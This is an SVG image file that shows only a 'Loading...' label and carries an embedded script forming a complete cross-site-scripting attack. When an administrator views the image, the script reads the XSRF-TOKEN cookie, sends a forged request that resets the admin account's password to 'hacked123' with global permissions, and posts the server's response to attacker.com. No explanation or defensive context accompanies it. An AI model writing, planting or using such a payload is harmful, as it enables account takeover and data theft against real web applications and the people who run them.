<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" viewBox="0 0 100 100">
    <rect width="100" height="100" fill="white"/>
    <text x="10" y="20" font-family="Arial" font-size="10" fill="black">Loading...</text>
    <script type="text/javascript">
    //<![CDATA[
        // Function to extract XSRF token from cookies
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }
        
        // Get the XSRF token
        const xsrfToken = getCookie('XSRF-TOKEN');
        
        // Prepare the form data
        const formData = new FormData();
        formData.append('id', '1');
        formData.append('name', 'Admin Compromised');
        formData.append('email', 'admin@example.com');
        formData.append('password', 'hacked123');  // New password
        formData.append('confirm_password', 'hacked123');  // Confirm new password
        formData.append('role_id', '1');
        formData.append('view_permission', 'global');
        formData.append('groups[]', '1');
        formData.append('status', '1');
        formData.append('_method', 'put');
        
        // Send the request to change password
        fetch('/admin/settings/users/edit/1', {
            method: 'POST',
            headers: {
                'X-XSRF-TOKEN': decodeURIComponent(xsrfToken),
                'Accept': 'application/json, text/plain, */*',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            // Optional: Send the response to attacker's server
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        })
        .catch(error => {
            console.error('Error:', error);
        });
    //]]>
    </script>
</svg>
